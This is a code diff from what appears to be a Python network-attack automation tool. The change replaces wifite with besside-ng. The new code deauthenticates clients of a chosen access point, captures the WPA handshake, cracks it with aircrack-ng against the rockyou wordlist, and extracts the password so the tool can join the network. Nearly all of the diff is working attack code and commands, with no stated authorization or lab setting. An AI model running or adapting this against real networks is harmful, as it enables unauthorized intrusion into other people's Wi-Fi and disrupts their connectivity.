@@ -446,7 +446,7 @@ def auto_route(subnets: list[str]):
 
 def preflight_check():
     """Verify required system tools are installed before running any phase."""
-    tools = ["nmap", "aircrack-ng", "airodump-ng", "wifite", "airmon-ng", "macchanger"]
+    tools = ["nmap", "aircrack-ng", "airodump-ng", "besside-ng", "airmon-ng", "macchanger"]
     missing = []
     for tool in tools:
         rc, _ = run_cmd(f"which {tool}", capture=False)
@@ -594,48 +594,48 @@ def phase1_wifi_crack() -> PhaseResult:
                 f"[bold white]Interface :[/bold white] {iface}\n"
                 f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                 f"[bold white]Channel   :[/bold white] {channel}\n"
-                f"[bold white]Duration  :[/bold white] 60 s\n"
-                f"[bold white]Method    :[/bold white] [green]Wifite2 (Auto-Deauth & Crack)[/green]",
-                title="[bold cyan] Executing Wifite Kill Chain [/bold cyan]",
+                f"[bold white]Duration  :[/bold white] 90 s\n"
+                f"[bold white]Method    :[/bold white] [green]besside-ng (targeted deauth)[/green]",
+                title="[bold cyan] Capturing Handshake [/bold cyan]",
                 border_style="cyan", expand=False,
             ))
 
-            run_cmd("sudo rm -f ./cracked.txt ./cracked.json", capture=False)
+            run_cmd("sudo rm -f ./wpa.cap ./wepe.cap ./besside.log ./cracked.txt", capture=False)
+
+            # Targeted besside-ng — -b restricts attack to our BSSID only
+            run_cmd(f"sudo besside-ng -b {bssid} {iface}", timeout=90)
+
             wl_arg = wl if wl else "/usr/share/wordlists/rockyou.txt"
 
-            wifite_cmd = (
-                f"sudo wifite --bssid {bssid} -i {iface} "
-                f"--wpa --dict {wl_arg} --wpat 60 --nodeauths --random-mac"
-            )
-            rc, out = run_cmd(wifite_cmd, timeout=300)
-
-            clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out)
             found_password = ""
 
-            # Primary: parse wifite's cracked.txt output file
-            if os.path.exists("./cracked.txt"):
-                with open("./cracked.txt", "r", errors="ignore") as f:
-                    cracked_data = f.read()
-                match = re.search(
-                    r'key:\s*["\']?(.*?)["\']?(?:\n|\r|$)',
-                    cracked_data, re.IGNORECASE,
+            if not os.path.exists("./wpa.cap"):
+                warn("No wpa.cap created — besside-ng may have lost monitor mode")
+            else:
+                ok("wpa.cap found — cracking with aircrack-ng...")
+                run_cmd(
+                    f"sudo aircrack-ng ./wpa.cap -w {wl_arg} -l cracked.txt",
+                    timeout=60,
                 )
-                if match:
-                    found_password = match.group(1).strip()
 
-            # Fallback: scan wifite stdout for the key line
-            if not found_password:
-                match = re.search(
-                    r'key:\s*["\']?(.*?)["\']?(?:\n|\r|$)',
-                    clean_out, re.IGNORECASE,
-                )
-                if match:
-                    found_password = match.group(1).strip()
+                # Read the password aircrack-ng wrote to cracked.txt
+                if os.path.exists("./cracked.txt"):
+                    with open("./cracked.txt", "r", errors="ignore") as f:
+                        found_password = f.read().strip()
+
+                # Fallback: scan stdout for KEY FOUND line
+                if not found_password:
+                    rc2, out2 = run_cmd(
+                        f"sudo aircrack-ng ./wpa.cap -w {wl_arg}", timeout=60
+                    )
+                    clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out2)
+                    match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean_out)
+                    if match:
+                        found_password = match.group(1).strip()
 
             if found_password:
                 r.status  = "success"
                 r.finding = f"KEY FOUND! [ {found_password} ]"
-                r.output  = out[-1000:]
                 ok(r.finding)
 
                 # Restore managed mode before nmcli tries to associate
@@ -660,15 +660,15 @@ def phase1_wifi_crack() -> PhaseResult:
                 ok(f"{iface} should now have an IP on the target network")
                 return r
 
-            warn("Wifite did not find the key")
+            warn("aircrack-ng did not find the key")
             console.print()
             if not Confirm.ask(
-                "[yellow]Retry Wifite attack on this AP?[/yellow]", default=True
+                "[yellow]Retry besside-ng capture on this AP?[/yellow]", default=True
             ):
                 break
 
         r.status  = "failed"
-        r.finding = "Wifite did not crack the key — try a longer attack or bigger wordlist"
+        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
         err(r.finding)
 
     finally:
